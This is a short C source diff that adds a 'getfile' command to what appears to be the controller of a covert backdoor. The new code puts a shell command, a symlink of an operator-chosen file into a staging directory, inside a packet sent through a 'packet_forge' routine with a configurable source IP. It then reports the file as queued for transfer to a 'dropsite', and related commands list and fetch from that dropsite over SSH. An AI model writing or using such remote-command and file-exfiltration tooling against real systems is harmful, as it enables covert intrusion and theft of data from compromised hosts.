@@ -182,7 +182,7 @@ void cli_interface(void)
 		else if (!strncmp(input, "watch\n", strlen(input)))
 			cli_watch();
 		else if (!strncmp(input, "getfile\n", strlen(input)))
-			fprintf(stderr, "%s: not yet implemented\n", input);
+			cli_getfile();
 		else if (!strncmp(input, "droplist\n", strlen(input)))
 			ssh_dropsite_list();
 		else if (!strncmp(input, "dropget\n", strlen(input)))
@@ -263,6 +263,7 @@ void cli_getfile(void)
 	size_t nbytes = 1024;
 	char *input = (char *)malloc(nbytes + 1);
 	char *file_name = (char *)malloc(nbytes + 1);
+	char *packet = (char *)malloc(nbytes + 1);
 
 	fprintf(stderr, "enter file > ");
 
@@ -273,10 +274,17 @@ void cli_getfile(void)
 	else {
 		memset(file_name, 0x00, nbytes + 1);
 		memcpy(file_name, input, strlen(input) - 1);
-		fprintf(stderr, "Sending to server...\n");
+
+		memset(packet, 0x00, nbytes + 1);
+		sprintf(packet, "%sln -sf %s %s%s", EXT_CMD_START, file_name,
+				SYMLINK_DIR, EXT_CMD_END);
+		packet_forge(packet, cli_vars.source_ip, cli_vars.server_ip);
+
+		fprintf(stderr, "File queued for transfer to dropsite...\n");
 	}
 
 	free(input);
+	free(packet);
 	free(file_name);
 }
 
